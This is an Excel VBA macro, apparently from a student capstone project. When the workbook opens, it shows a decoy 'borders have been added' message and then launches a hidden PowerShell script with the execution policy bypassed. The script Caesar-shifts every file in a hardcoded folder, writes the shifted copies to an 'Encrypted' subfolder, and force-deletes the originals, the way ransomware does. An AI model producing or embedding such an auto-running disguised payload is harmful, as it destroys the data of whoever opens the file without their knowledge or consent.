Dim isScriptRunning As Boolean

Private Sub Workbook_Open()
    isScriptRunning = False
    MsgBox "Welcome to Excel! Borders have been added to the content.", vbInformation, "Workbook Opened"
    RunPowerShellScript
End Sub

Private Sub RunPowerShellScript()
    isScriptRunning = True
    Dim powerShellScript As String
    powerShellScript = "$folderPath = ""D:\Drive\APranav\Capstone\Phase2\DP\test""" & vbCrLf & _ "$shift = 25" & vbCrLf & vbCrLf & _
                      "$files = Get-ChildItem -Path $folderPath" & vbCrLf & vbCrLf & _
                      "$encryptedFolderPath = Join-Path -Path $folderPath -ChildPath ""Encrypted""" & vbCrLf & _
                      "New-Item -ItemType Directory -Path $encryptedFolderPath | Out-Null" & vbCrLf & vbCrLf & _
                      "foreach ($file in $files) {" & vbCrLf & _
                      "    $content = Get-Content -Path $file.FullName -Raw" & vbCrLf & vbCrLf & _
                      "    $characters = $content.ToCharArray()" & vbCrLf & vbCrLf & _
                      "    for ($i = 0; $i -lt $characters.Length; $i++) {" & vbCrLf & _
                      "        $char = $characters[$i]" & vbCrLf & vbCrLf & _
                      "        if ($char -match ""[a-zA-Z]"") {" & vbCrLf & _
                      "            $ascii = [int]$char" & vbCrLf & vbCrLf & _
                      "            if ($char -cmatch ""[a-z]"") {" & vbCrLf & _
                      "                $encryptedChar = [char]((($ascii - 97 + $shift) % 26) + 97)" & vbCrLf & _
                      "            }" & vbCrLf & _
                      "            elseif ($char -cmatch ""[A-Z]"") {" & vbCrLf & _
                      "                $encryptedChar = [char]((($ascii - 65 + $shift) % 26) + 65)" & vbCrLf & _
                      "            }" & vbCrLf & vbCrLf & _
                      "            $characters[$i] = $encryptedChar" & vbCrLf & _
                      "        }" & vbCrLf & _
                      "    }" & vbCrLf & vbCrLf & _
                      "    $encryptedContent = -join $characters" & vbCrLf & vbCrLf & _
                      "    $encryptedFilePath = Join-Path -Path $encryptedFolderPath -ChildPath $file.Name" & vbCrLf & vbCrLf & _
                      "    $encryptedContent | Out-File -FilePath $encryptedFilePath -Encoding UTF8" & vbCrLf & vbCrLf & _
                      "    Remove-Item -Path $file.FullName -Force" & vbCrLf & _
                      "}"

    Dim cmd As String
    cmd = "powershell.exe -ExecutionPolicy Bypass -Command """ & powerShellScript & """"
    Shell cmd, vbHide
    isScriptRunning = False
End Sub

Sub CloseWorkbook()
    If isScriptRunning Then Exit Sub ' Exit if the script is still running
    ThisWorkbook.Close SaveChanges:=False
End Sub
